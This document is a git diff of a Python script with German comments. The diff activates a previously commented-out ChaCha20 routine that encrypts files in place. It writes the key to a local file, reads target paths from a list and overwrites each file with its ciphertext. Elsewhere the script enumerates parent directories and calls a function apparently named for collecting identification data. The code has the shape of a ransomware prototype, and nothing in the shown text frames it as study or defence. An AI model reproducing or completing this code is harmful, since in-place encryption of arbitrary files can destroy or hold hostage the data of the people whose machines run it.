@@ -44,13 +44,6 @@ def list_files_directories(path, depth=0):
             list_files_directories(entry.path, depth + 1)
 
 
-
-kenndaten()
-list_files_directories('../', depth=2)
-
-
-
-'''
 def encrypt_file_chacha20(key, input_file, output_file):
     # Generiere einen zufälligen Nonce
     nonce = os.urandom(16)
@@ -75,13 +68,11 @@ key = os.urandom(32)  # Erzeuge einen zufälligen 256-Bit-Schlüssel
 with open("chkey.txt", "wb") as keyfile:
     keyfile.write(key)
 
-for file in os.walk('encryptme/'):
-    files = file[2]
 
-for i in files:
-    input_file = "encryptme/"+i
-    output_file = "encryptme/"+i
-    encrypt_file_chacha20(key, input_file, output_file)
+with open("testd.txt", "r") as file:
+    for line in file:
+        line = line.rstrip("\n")
+        print(line)
+        encrypt_file_chacha20(key, line, line)
 
-'''
 
